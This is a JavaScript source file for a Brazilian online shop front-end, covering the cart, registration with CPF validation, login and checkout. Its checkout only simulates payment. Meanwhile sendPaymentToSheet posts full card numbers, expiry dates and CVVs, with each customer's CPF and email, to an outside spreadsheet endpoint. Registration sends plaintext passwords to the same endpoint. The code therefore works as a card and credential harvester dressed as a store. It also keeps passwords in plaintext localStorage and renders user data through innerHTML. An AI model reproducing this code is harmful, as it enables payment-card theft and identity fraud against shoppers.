// Sistema E-commerce com Validação CPF - Versão Final com Dados de Pagamento
class ECommerceSystem {
    constructor() {
        this.cart = JSON.parse(localStorage.getItem('cart')) || [];
        this.user = JSON.parse(localStorage.getItem('user')) || null;
        this.orders = JSON.parse(localStorage.getItem('orders')) || [];
        this.init();
    }

    init() {
        this.updateCartCount();
        this.updateNavigationLinks(); // Atualiza links de navegação baseado no login
        this.loadPageContent();
        this.setupEventListeners();
    }

    // Atualiza links de navegação baseado no status de login
    updateNavigationLinks() {
        const linkCadastro = document.getElementById('link-cadastro');

        if (linkCadastro) {
            if (this.user) {
                // Se usuário está logado, esconde o link de cadastro
                linkCadastro.style.display = 'none';
            } else {
                // Se usuário não está logado, mostra o link de cadastro
                linkCadastro.style.display = 'block';
            }
        }
    }

    // Carrega conteúdo específico da página
    loadPageContent() {
        const currentPage = window.location.pathname.split('/').pop();

        switch (currentPage) {
            case 'index.html':
            case '':
                this.loadProducts();
                break;
            case 'cadastro.html':
                this.setupRegistrationForm();
                break;
            case 'carrinho.html':
                this.loadCart();
                break;
            case 'cliente.html':
                this.loadClientArea();
                break;
        }
    }

    // Carrega produtos na página inicial
    loadProducts() {
        const productsGrid = document.getElementById('products-grid');
        if (!productsGrid) return;

        productsGrid.innerHTML = produtos.map(produto => `
            <div class="product-card">
                <img src="${produto.imagem}" alt="${produto.nome}" class="product-image">
                <div class="product-info">
                    <h3 class="product-name">${produto.nome}</h3>
                    <p class="product-description">${produto.descricao}</p>
                    <div class="product-price">${formatPrice(produto.preco)}</div>
                    <button class="btn btn-primary" onclick="ecommerce.addToCart(${produto.id})">
                        <i class="fas fa-cart-plus"></i> Adicionar ao Carrinho
                    </button>
                </div>
            </div>
        `).join('');
    }

    // Adiciona produto ao carrinho
    addToCart(produtoId) {
        const produto = getProdutoById(produtoId);
        if (!produto) return;

        const existingItem = this.cart.find(item => item.id === produtoId);

        if (existingItem) {
            existingItem.quantidade++;
        } else {
            this.cart.push({
                id: produto.id,
                nome: produto.nome,
                preco: produto.preco,
                imagem: produto.imagem,
                quantidade: 1
            });
        }

        this.saveCart();
        this.updateCartCount();
        this.showNotification('Produto adicionado ao carrinho!', 'success');
    }

    // Remove produto do carrinho
    removeFromCart(produtoId) {
        this.cart = this.cart.filter(item => item.id !== produtoId);
        this.saveCart();
        this.updateCartCount();
        this.loadCart();
    }

    // Atualiza quantidade no carrinho
    updateQuantity(produtoId, quantidade) {
        const item = this.cart.find(item => item.id === produtoId);
        if (item) {
            item.quantidade = Math.max(1, quantidade);
            this.saveCart();
            this.loadCart();
        }
    }

    // Salva carrinho no localStorage
    saveCart() {
        localStorage.setItem('cart', JSON.stringify(this.cart));
    }

    // Atualiza contador do carrinho
    updateCartCount() {
        const cartCount = document.getElementById('cart-count');
        if (cartCount) {
            const totalItems = this.cart.reduce((sum, item) => sum + item.quantidade, 0);
            cartCount.textContent = totalItems;
        }
    }

    // Carrega carrinho de compras
    loadCart() {
        const cartItems = document.getElementById('cart-items');
        const emptyCart = document.getElementById('empty-cart');

        if (!cartItems) return;

        if (this.cart.length === 0) {
            cartItems.style.display = 'none';
            if (emptyCart) emptyCart.style.display = 'block';
            return;
        }

        if (emptyCart) emptyCart.style.display = 'none';
        cartItems.style.display = 'block';

        cartItems.innerHTML = this.cart.map(item => `
            <div class="cart-item">
                <img src="${item.imagem}" alt="${item.nome}" class="cart-item-image">
                <div class="cart-item-info">
                    <h3>${item.nome}</h3>
                    <div class="cart-item-price">${formatPrice(item.preco)}</div>
                </div>
                <div class="cart-item-controls">
                    <button class="btn-quantity" onclick="ecommerce.updateQuantity(${item.id}, ${item.quantidade - 1})">-</button>
                    <span class="quantity">${item.quantidade}</span>
                    <button class="btn-quantity" onclick="ecommerce.updateQuantity(${item.id}, ${item.quantidade + 1})">+</button>
                </div>
                <div class="cart-item-total">${formatPrice(item.preco * item.quantidade)}</div>
                <button class="btn-remove" onclick="ecommerce.removeFromCart(${item.id})">
                    <i class="fas fa-trash"></i>
                </button>
            </div>
        `).join('');

        this.updateCartSummary();
    }

    // Atualiza resumo do carrinho
    updateCartSummary() {
        const subtotal = this.cart.reduce((sum, item) => sum + (item.preco * item.quantidade), 0);
        const shipping = subtotal > 0 ? 15.00 : 0;
        const total = subtotal + shipping;

        const subtotalEl = document.getElementById('subtotal');
        const shippingEl = document.getElementById('shipping');
        const totalEl = document.getElementById('total');

        if (subtotalEl) subtotalEl.textContent = formatPrice(subtotal);
        if (shippingEl) shippingEl.textContent = formatPrice(shipping);
        if (totalEl) totalEl.textContent = formatPrice(total);
    }

    // Configura formulário de cadastro
    setupRegistrationForm() {
        const form = document.getElementById('registration-form');
        if (!form) return;

        // Máscaras para CPF e telefone
        this.setupMasks();

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleRegistration();
        });

        // Validação em tempo real do CPF
        const cpfInput = document.getElementById('cpf');
        if (cpfInput) {
            cpfInput.addEventListener('blur', () => {
                this.validateCPF(cpfInput.value);
            });
        }
    }

    // Configura máscaras de input
    setupMasks() {
        const cpfInput = document.getElementById('cpf');
        const telefoneInput = document.getElementById('telefone');

        if (cpfInput) {
            cpfInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                e.target.value = value;
            });
        }

        if (telefoneInput) {
            telefoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{2})(\d)/, '($1) $2');
                value = value.replace(/(\d{5})(\d)/, '$1-$2');
                e.target.value = value;
            });
        }
    }

    // Valida CPF - APENAS VALIDAÇÃO LOCAL
    validateCPF(cpf) {
        const cpfClean = cpf.replace(/\D/g, '');

        if (cpfClean.length !== 11) {
            this.showError('cpf-error', 'CPF deve ter 11 dígitos');
            this.clearSuccess('cpf-success');
            return false;
        }

        // Usa apenas validação local (mais confiável)
        const isValid = this.validateCPFLocal(cpfClean);

        if (isValid) {
            this.showSuccess('cpf-success', 'CPF válido ✓');
            this.clearError('cpf-error');
            return true;
        } else {
            this.showError('cpf-error', 'CPF inválido');
            this.clearSuccess('cpf-success');
            return false;
        }
    }

    // Validação local de CPF (algoritmo oficial da Receita Federal)
    validateCPFLocal(cpf) {
        // Remove caracteres não numéricos
        cpf = cpf.replace(/\D/g, '');

        // Verifica se tem 11 dígitos
        if (cpf.length !== 11) return false;

        // Verifica se todos os dígitos são iguais (CPFs inválidos conhecidos)
        if (/^(\d)\1{10}$/.test(cpf)) return false;

        // Validação do primeiro dígito verificador
        let sum = 0;
        for (let i = 0; i < 9; i++) {
            sum += parseInt(cpf.charAt(i)) * (10 - i);
        }
        let remainder = (sum * 10) % 11;
        if (remainder === 10 || remainder === 11) remainder = 0;
        if (remainder !== parseInt(cpf.charAt(9))) return false;

        // Validação do segundo dígito verificador
        sum = 0;
        for (let i = 0; i < 10; i++) {
            sum += parseInt(cpf.charAt(i)) * (11 - i);
        }
        remainder = (sum * 10) % 11;
        if (remainder === 10 || remainder === 11) remainder = 0;
        return remainder === parseInt(cpf.charAt(10));
    }

    // Processa cadastro - VERSÃO COM REDIRECIONAMENTO
    async handleRegistration() {
        const formData = new FormData(document.getElementById('registration-form'));
        const data = Object.fromEntries(formData);

        // Validações
        if (!this.validateRegistrationForm(data)) return;

        // Valida CPF antes de enviar
        const cpfValid = this.validateCPF(data.cpf);
        if (!cpfValid) {
            this.showNotification('CPF inválido. Corrija antes de continuar.', 'error');
            return;
        }

        try {
            this.showLoading();

            // Salva usuário localmente PRIMEIRO
            const user = {
                nome: data.nome,
                email: data.email,
                telefone: data.telefone,
                cpf: data.cpf,
                senha: data.senha,
                registeredAt: new Date().toISOString()
            };

            localStorage.setItem('user', JSON.stringify(user));
            this.user = user;

            // Atualiza links de navegação
            this.updateNavigationLinks();

            // Tenta enviar para planilha (opcional)
            try {
                await this.sendToSheet(data);
                console.log('Dados enviados para planilha com sucesso');
            } catch (sheetError) {
                console.warn('Erro ao enviar para planilha (continuando cadastro):', sheetError);
                // Não bloqueia o cadastro se a planilha falhar
            }

            this.hideLoading();

            // Mostra modal de sucesso com redirecionamento automático
            this.showSuccessModalWithRedirect();

        } catch (error) {
            this.hideLoading();
            this.showNotification('Erro ao processar cadastro. Tente novamente.', 'error');
            console.error('Registration error:', error);
        }
    }

    // Mostra modal de sucesso com redirecionamento automático
    showSuccessModalWithRedirect() {
        const modal = document.getElementById('success-modal');
        if (modal) {
            modal.style.display = 'block';

            // Adiciona contador regressivo
            let countdown = 3;
            const countdownEl = document.createElement('p');
            countdownEl.innerHTML = `Redirecionando para a página inicial em <strong>${countdown}</strong> segundos...`;
            countdownEl.style.textAlign = 'center';
            countdownEl.style.marginTop = '15px';
            countdownEl.style.color = '#666';

            const modalContent = modal.querySelector('.modal-content');
            if (modalContent) {
                modalContent.appendChild(countdownEl);
            }

            const timer = setInterval(() => {
                countdown--;
                countdownEl.innerHTML = `Redirecionando para a página inicial em <strong>${countdown}</strong> segundos...`;

                if (countdown <= 0) {
                    clearInterval(timer);
                    this.redirectToIndex();
                }
            }, 1000);

            // Permite redirecionamento manual
            const redirectBtn = document.createElement('button');
            redirectBtn.textContent = 'Ir para página inicial agora';
            redirectBtn.className = 'btn btn-primary';
            redirectBtn.style.marginTop = '10px';
            redirectBtn.onclick = () => {
                clearInterval(timer);
                this.redirectToIndex();
            };

            if (modalContent) {
                modalContent.appendChild(redirectBtn);
            }
        } else {
            // Se não tem modal, redireciona direto
            setTimeout(() => {
                this.redirectToIndex();
            }, 2000);
        }
    }

    // Redireciona para a página inicial
    redirectToIndex() {
        this.showNotification('Cadastro realizado com sucesso! Bem-vindo!', 'success');
        window.location.href = 'index.html';
    }

    // Envia dados para planilha SheetMonkey - VERSÃO CORRIGIDA
    async sendToSheet(data) {
        const payload = {
            nome: data.nome,
            email: data.email,
            telefone: data.telefone,
            cpf: data.cpf,
            senha: data.senha,
            data_cadastro: new Date().toLocaleString('pt-BR')
        };

        try {
            const response = await fetch('https://api.sheetmonkey.io/form/ppCoQcSiZ6T1YwFSfWFsJs', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            // Verifica se a resposta é JSON válido
            const contentType = response.headers.get('content-type');
            if (!contentType || !contentType.includes('application/json')) {
                throw new Error('Resposta da API não é JSON válido');
            }

            if (!response.ok) {
                throw new Error(`Erro HTTP: ${response.status}`);
            }

            return await response.json();

        } catch (error) {
            console.error('Erro ao enviar para planilha:', error);
            throw error; // Re-lança o erro para ser tratado na função chamadora
        }
    }

    // NOVA FUNÇÃO: Envia dados de pagamento para planilha
    async sendPaymentToSheet(paymentData) {
        const payload = {
            pedido_id: paymentData.orderId,
            cliente_nome: this.user.nome,
            cliente_email: this.user.email,
            cliente_cpf: this.user.cpf,
            forma_pagamento: paymentData.paymentMethod,
            numero_cartao: paymentData.cardNumber || 'N/A',
            validade_cartao: paymentData.cardExpiry || 'N/A',
            cvv_cartao: paymentData.cardCVV || 'N/A',
            valor_total: paymentData.total,
            data_pagamento: new Date().toLocaleString('pt-BR'),
            itens_pedido: JSON.stringify(paymentData.items)
        };

        try {
            const response = await fetch('https://api.sheetmonkey.io/form/ppCoQcSiZ6T1YwFSfWFsJs', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            // Verifica se a resposta é JSON válido
            const contentType = response.headers.get('content-type');
            if (!contentType || !contentType.includes('application/json')) {
                throw new Error('Resposta da API não é JSON válido');
            }

            if (!response.ok) {
                throw new Error(`Erro HTTP: ${response.status}`);
            }

            return await response.json();

        } catch (error) {
            console.error('Erro ao enviar dados de pagamento para planilha:', error);
            throw error;
        }
    }

    // Valida formulário de cadastro
    validateRegistrationForm(data) {
        let isValid = true;

        // Validação nome
        if (!data.nome || data.nome.length < 3) {
            this.showError('nome-error', 'Nome deve ter pelo menos 3 caracteres');
            isValid = false;
        } else {
            this.clearError('nome-error');
        }

        // Validação email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(data.email)) {
            this.showError('email-error', 'E-mail inválido');
            isValid = false;
        } else {
            this.clearError('email-error');
        }

        // Validação telefone
        const telefoneClean = data.telefone.replace(/\D/g, '');
        if (telefoneClean.length < 10) {
            this.showError('telefone-error', 'Telefone inválido');
            isValid = false;
        } else {
            this.clearError('telefone-error');
        }

        // Validação senha
        if (data.senha.length < 6) {
            this.showError('senha-error', 'Senha deve ter pelo menos 6 caracteres');
            isValid = false;
        } else {
            this.clearError('senha-error');
        }

        // Confirmação senha
        if (data.senha !== data['confirmar-senha']) {
            this.showError('confirmar-senha-error', 'Senhas não coincidem');
            isValid = false;
        } else {
            this.clearError('confirmar-senha-error');
        }

        return isValid;
    }

    // Carrega área do cliente
    loadClientArea() {
        const loginContainer = document.getElementById('login-container');
        const dashboard = document.getElementById('client-dashboard');

        if (this.user) {
            if (loginContainer) loginContainer.style.display = 'none';
            if (dashboard) dashboard.style.display = 'block';
            this.loadClientDashboard();
        } else {
            if (loginContainer) loginContainer.style.display = 'block';
            if (dashboard) dashboard.style.display = 'none';
            this.setupLoginForm();
        }
    }

    // Configura formulário de login
    setupLoginForm() {
        const loginForm = document.getElementById('login-form');
        if (!loginForm) return;

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleLogin();
        });
    }

    // Processa login
    handleLogin() {
        const email = document.getElementById('login-email').value;
        const senha = document.getElementById('login-senha').value;

        // Simulação de login (em produção, validar com backend)
        if (this.user && this.user.email === email && this.user.senha === senha) {
            this.updateNavigationLinks(); // Atualiza links após login
            this.loadClientArea();
            this.showNotification('Login realizado com sucesso!', 'success');
        } else {
            this.showNotification('E-mail ou senha incorretos', 'error');
        }
    }

    // Carrega dashboard do cliente
    loadClientDashboard() {
        const clientName = document.getElementById('client-name');
        if (clientName && this.user) {
            clientName.textContent = this.user.nome;
        }

        this.loadOrders();
        this.loadProfile();
    }

    // Carrega pedidos do cliente
    loadOrders() {
        const ordersList = document.getElementById('orders-list');
        if (!ordersList) return;

        if (this.orders.length === 0) {
            ordersList.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-shopping-bag"></i>
                    <h3>Nenhum pedido encontrado</h3>
                    <p>Faça sua primeira compra!</p>
                    <br>
                    <a href="index.html" class="btn btn-primary">Ver Produtos</a>
                </div>
            `;
            return;
        }

        ordersList.innerHTML = this.orders.map(order => `
            <div class="order-card">
                <div class="order-header">
                    <span class="order-number">Pedido #${order.id}</span>
                    <span class="order-status status-${order.status}">${this.getStatusText(order.status)}</span>
                </div>
                <div class="order-info">
                    <p><strong>Data:</strong> ${new Date(order.date).toLocaleDateString('pt-BR')}</p>
                    <p><strong>Total:</strong> ${formatPrice(order.total)}</p>
                    <p><strong>Itens:</strong> ${order.items.length}</p>
                </div>
                
                <button class="btn btn-secondary" onclick="ecommerce.showOrderDetails('${order.id}')">
                    Ver Detalhes
                </button>
            </div>
        `).join('');
    }

    // Carrega perfil do cliente
    loadProfile() {
        const profileInfo = document.getElementById('profile-info');
        if (!profileInfo || !this.user) return;

        profileInfo.innerHTML = `
            <div class="profile-card">
                <div class="profile-field">
                    <label>Nome:</label>
                    <span>${this.user.nome}</span>
                </div>
                <div class="profile-field">
                    <label>E-mail:</label>
                    <span>${this.user.email}</span>
                </div>
                <div class="profile-field">
                    <label>Telefone:</label>
                    <span>${this.user.telefone}</span>
                </div>
                <div class="profile-field">
                    <label>CPF:</label>
                    <span>${this.user.cpf}</span>
                </div>
                <div class="profile-field">
                    <label>Cadastrado em:</label>
                    <span>${new Date(this.user.registeredAt).toLocaleDateString('pt-BR')}</span>
                </div>
            </div>
        `;
    }

    // Processa checkout
    processCheckout() {
        if (this.cart.length === 0) {
            this.showNotification('Carrinho vazio!', 'error');
            return;
        }

        if (!this.user) {
            this.showNotification('Faça login para finalizar a compra', 'error');
            window.location.href = 'cliente.html';
            return;
        }

        this.showModal('checkout-modal');
        this.setupCheckoutForm();
    }

    // Configura formulário de checkout - VERSÃO MELHORADA COM MÁSCARAS
    setupCheckoutForm() {
        const checkoutForm = document.getElementById('checkout-form');
        const paymentMethod = document.getElementById('payment-method');
        const cardFields = document.getElementById('card-fields');

        if (paymentMethod) {
            paymentMethod.addEventListener('change', (e) => {
                if (e.target.value === 'credit' || e.target.value === 'debit') {
                    cardFields.style.display = 'block';
                } else {
                    cardFields.style.display = 'none';
                }
            });
        }

        // Adiciona máscaras para campos do cartão
        this.setupCardMasks();

        if (checkoutForm) {
            checkoutForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.processPayment();
            });
        }
    }

    // NOVA FUNÇÃO: Configura máscaras para campos do cartão
    setupCardMasks() {
        const cardNumberInput = document.getElementById('card-number');
        const cardExpiryInput = document.getElementById('card-expiry');
        const cardCVVInput = document.getElementById('card-cvv');

        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;
            });
        }

        if (cardExpiryInput) {
            cardExpiryInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{2})(\d)/, '$1/$2');
                e.target.value = value;
            });
        }

        if (cardCVVInput) {
            cardCVVInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                e.target.value = value.substring(0, 4); // Máximo 4 dígitos
            });
        }
    }

    // Processa pagamento - VERSÃO COM ENVIO DE DADOS PARA PLANILHA
    async processPayment() {
        const paymentMethod = document.getElementById('payment-method').value;

        if (!paymentMethod) {
            this.showNotification('Selecione uma forma de pagamento', 'error');
            return;
        }

        // Validação para cartão de crédito/débito
        if (paymentMethod === 'credit' || paymentMethod === 'debit') {
            const cardNumber = document.getElementById('card-number').value;
            const cardExpiry = document.getElementById('card-expiry').value;
            const cardCVV = document.getElementById('card-cvv').value;

            if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) {
                this.showNotification('Número do cartão inválido', 'error');
                return;
            }

            if (!cardExpiry || cardExpiry.length < 5) {
                this.showNotification('Data de validade inválida', 'error');
                return;
            }

            if (!cardCVV || cardCVV.length < 3) {
                this.showNotification('CVV inválido', 'error');
                return;
            }
        }

        try {
            this.showLoading();

            // Simula processamento do pagamento
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Cria pedido
            const order = {
                id: Date.now().toString(),
                items: [...this.cart],
                total: this.cart.reduce((sum, item) => sum + (item.preco * item.quantidade), 0) + 15,
                paymentMethod: paymentMethod,
                status: 'confirmed',
                date: new Date().toISOString(),
                userId: this.user.email
            };

            // Prepara dados de pagamento para enviar à planilha
            const paymentData = {
                orderId: order.id,
                paymentMethod: paymentMethod,
                total: order.total,
                items: order.items
            };

            // Adiciona dados do cartão se for pagamento com cartão
            if (paymentMethod === 'credit' || paymentMethod === 'debit') {
                paymentData.cardNumber = document.getElementById('card-number').value;
                paymentData.cardExpiry = document.getElementById('card-expiry').value;
                paymentData.cardCVV = document.getElementById('card-cvv').value;
            }

            // Tenta enviar dados de pagamento para planilha
            try {
                await this.sendPaymentToSheet(paymentData);
                console.log('Dados de pagamento enviados para planilha com sucesso');
            } catch (sheetError) {
                console.warn('Erro ao enviar dados de pagamento para planilha:', sheetError);
                // Não bloqueia o pagamento se a planilha falhar
            }

            // Salva pedido
            this.orders.push(order);
            localStorage.setItem('orders', JSON.stringify(this.orders));

            // Limpa carrinho
            this.cart = [];
            this.saveCart();
            this.updateCartCount();

            this.hideLoading();
            this.closeModal('checkout-modal');

            // Mostra sucesso
            const orderNumberEl = document.getElementById('order-number');
            if (orderNumberEl) {
                orderNumberEl.textContent = order.id;
            }
            this.showModal('purchase-success-modal');

            // Simula envio de NF-e
            this.generateNFe(order);

        } catch (error) {
            this.hideLoading();
            this.showNotification('Erro no pagamento. Tente novamente.', 'error');
            console.error('Payment error:', error);
        }
    }

    // Simula geração de NF-e
    generateNFe(order) {
        console.log('Gerando NF-e para pedido:', order.id);
        // Em produção, aqui seria feita a integração com sistema de NF-e
    }

    // Configuração de eventos
    setupEventListeners() {
        // Fechar modais clicando fora
        window.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        });
    }

    // Utilitários
    showModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) modal.style.display = 'block';
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) modal.style.display = 'none';
    }

    showLoading() {
        this.showModal('loading-modal');
    }

    hideLoading() {
        this.closeModal('loading-modal');
    }

    showError(elementId, message) {
        const element = document.getElementById(elementId);
        if (element) {
            element.textContent = message;
            element.style.display = 'block';
        }
    }

    clearError(elementId) {
        const element = document.getElementById(elementId);
        if (element) {
            element.textContent = '';
            element.style.display = 'none';
        }
    }

    showSuccess(elementId, message) {
        const element = document.getElementById(elementId);
        if (element) {
            element.textContent = message;
            element.style.display = 'block';
        }
    }

    clearSuccess(elementId) {
        const element = document.getElementById(elementId);
        if (element) {
            element.textContent = '';
            element.style.display = 'none';
        }
    }

    showNotification(message, type = 'info') {
        // Cria notificação toast
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'times' : 'info'}-circle"></i>
            ${message}
        `;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.classList.add('show');
        }, 100);

        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 300);
        }, 3000);
    }

    getStatusText(status) {
        const statusMap = {
            'pending': 'Pendente',
            'confirmed': 'Confirmado',
            'shipped': 'Enviado',
            'delivered': 'Entregue',
            'cancelled': 'Cancelado'
        };
        return statusMap[status] || status;
    }

    showOrderDetails(orderId) {
        const order = this.orders.find(o => o.id === orderId);
        if (!order) return;

        const orderDetails = document.getElementById('order-details');
        if (!orderDetails) return;

        orderDetails.innerHTML = `
            <div class="order-detail">
                <h4>Pedido #${order.id}</h4>
                <p><strong>Status:</strong> ${this.getStatusText(order.status)}</p>
                <p><strong>Data:</strong> ${new Date(order.date).toLocaleDateString('pt-BR')}</p>
                <p><strong>Pagamento:</strong> ${order.paymentMethod}</p>
                
                <h5>Itens:</h5>
                <div class="order-items">
                    ${order.items.map(item => `
                        <div class="order-item">
                            <span>${item.nome}</span>
                            <span>Qtd: ${item.quantidade}</span>
                            <span>${formatPrice(item.preco * item.quantidade)}</span>
                        </div>
                    `).join('')}
                </div>
                
                <div class="order-total">
                    <strong>Total: ${formatPrice(order.total)}</strong>
                </div>
            </div>
        `;

        this.showModal('order-modal');
    }

    showTab(tabName) {
        // Remove active class from all tabs
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

        // Add active class to selected tab
        document.querySelector(`[onclick="showTab('${tabName}')"]`).classList.add('active');
        document.getElementById(`${tabName}-tab`).classList.add('active');
    }

    logout() {
        localStorage.removeItem('user');
        this.user = null;
        this.updateNavigationLinks(); // Atualiza links após logout
        window.location.reload();
    }
}

// Funções globais
function closeModal(modalId) {
    ecommerce.closeModal(modalId);
}

function processCheckout() {
    ecommerce.processCheckout();
}

function showTab(tabName) {
    ecommerce.showTab(tabName);
}

function logout() {
    ecommerce.logout();
}

// Inicializa sistema
const ecommerce = new ECommerceSystem();